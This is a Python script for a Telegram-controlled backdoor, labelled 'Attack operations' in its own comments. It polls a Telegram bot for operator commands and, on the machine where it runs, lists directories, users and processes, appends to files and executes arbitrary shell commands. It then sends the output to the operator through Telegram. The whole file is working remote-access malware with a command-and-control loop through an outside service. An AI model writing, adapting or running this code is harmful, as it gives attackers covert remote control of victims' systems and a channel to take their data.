#!/usr/bin/env python
from typing import Any, Generator
from os import listdir, popen
from requests import get
from json import loads
from time import sleep
import utils

SLEEP_TIME = 3
MAX_MESSAGE_LENGTH = 4000


# Parse JSON from URL request answer
def get_json(url: str):
    res = get(url)
    return loads(res.content) if res.status_code == 200 else None


# ! Attack operations
# ! -----------------


def ls(path: str) -> str:
    try:
        return '\n'.join(listdir(path))
    except FileNotFoundError:
        print("No such directory")
        return "Err: No such dir"


def active_users() -> str:
    return '\n'.join([line.split('    ')[0] for line in popen('w').readlines()[-1:1:-1]])


def ps() -> str:
    return ''.join([line.split(' ')[-1] for line in popen('ps').readlines()[-1:0:-1]])


def write_to_file(filename: str, data: str) -> Any:
    try:
        with open(filename, 'a') as file:
            file.write(data)
            return 'done'

    except FileNotFoundError as Error:
        print(Error)
        return Error


def exec_command(command: str) -> str:
    return '\n'.join(popen(command).readlines())


def parse_payload(command: str) :
    splitted = command.split(" ")
    if splitted[0] == "ls" and len(splitted) >= 2:
        files = ls(splitted[1])
        return utils.DIR_HTML.format(splitted[1]) + files
    elif splitted[0] == "users":
        return utils.USR_HTML + active_users()
    elif splitted[0] == "processes":
        return utils.PCS_HTML + ps()
    elif splitted[0] == "write" and len(splitted) >= 3:
        return utils.WRT_HTML + write_to_file(splitted[1], splitted[2])
    elif splitted[0] == 'execute':
        return exec_command(' '.join(splitted[1:]))
    elif splitted[0] == "terminate":
        return "terminate"
    else:
        return utils.HELP


# ! Telegram API communication
# ! --------------------------
def get_status() -> None:
    answer = get(utils.URL + "/getme")
    if answer.status_code == 200:
        print("Connection works")
    else:
        print("Connection does not work")


def mark_read(offset: int) -> None:
    get_json(utils.URL + "/getUpdates?offset={}".format(offset))


def get_updates() -> Generator:
    answer = get_json(utils.URL + "/getUpdates")
    if (answer is None) or (not answer["ok"]):
        print("Wrong request for Updates")
        return

    for result in answer["result"]:
        yield result


def send_answer(msg: str, chat_id: int) -> None:
    start = 0
    end = min(len(msg), MAX_MESSAGE_LENGTH)

    while True:
        answer = get_json(utils.URL + "/sendMessage?text={}&chat_id={}".format(msg[start:end], chat_id))

        if (answer is None) or (not answer["ok"]):
            print("Wrong answer")
            return

        if len(msg) - end < MAX_MESSAGE_LENGTH:
            break
        start = end
        end = min(len(msg), start + MAX_MESSAGE_LENGTH)


# Main runtime - loop until terminate message is obtained
if __name__ == "__main__":
    end = False
    while not end:
        update_id = -1
        for update in get_updates():
            update_id = update["update_id"] + 1
            message = update["message"]
            chat_id = message["chat"]["id"]

            response = parse_payload(message["text"])
            if response == "terminate":
                end = True
                break
            send_answer(response, chat_id)

        if update_id != -1:
            mark_read(update_id)
        if not end:
            sleep(SLEEP_TIME)
